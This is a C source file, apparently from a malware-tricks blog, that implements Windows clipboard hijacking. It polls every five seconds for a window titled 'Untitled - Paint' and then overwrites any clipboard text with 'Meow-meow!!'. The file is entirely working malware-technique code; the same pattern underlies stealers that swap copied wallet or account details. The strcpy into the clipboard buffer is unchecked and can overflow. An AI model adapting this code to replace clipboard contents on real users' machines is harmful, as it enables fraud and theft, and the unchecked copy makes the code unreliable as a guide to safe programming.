/*
 * hack2.c
 * simple clipboard hijacking
 * specific process paint.exe
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/05/10/malware-tricks-47.html
 */
#include <windows.h>
#include <stdio.h>

char* subStr(char *str, char *substr) {
  while (*str) {
    char *begin = str;
    char *pattern = substr;
    while (*str && *pattern && *str == *pattern) {
      str++;
      pattern++;
    }
    if (!*pattern)
      return begin;

    str = begin + 1;
  }
  return NULL;
}

void hijackClipboard() {
  if (OpenClipboard(NULL)) {
    // check if there is text data in the buf
    if (IsClipboardFormatAvailable(CF_TEXT)) {
      HANDLE hData = GetClipboardData(CF_TEXT);  // get
      if (hData != NULL) {
        // lock access to the buffer data
        char *data = (char *)GlobalLock(hData);
        if (data != NULL) {
          // replace with "Meow-meow!!"
          strcpy(data, "Meow-meow!!");
          EmptyClipboard();
          SetClipboardData(CF_TEXT, hData);
          GlobalUnlock(hData);
        }
      }
    }
    CloseClipboard();
  }
}

int isPaintRunning() {
  HWND hwnd = FindWindow(NULL, "Untitled - Paint");
  return hwnd != NULL;  // return 1 if paint is running, else 0
}

int main() {
  while (1) {
    if (isPaintRunning()) {
      printf("paint is running! hijacking clipboard...\n");
      hijackClipboard();  // hijack clipboard when paint is detected
    } else {
      printf("paint is not running.\n");
    }
    Sleep(5000);  // check every 5 seconds
  }
  return 0;
}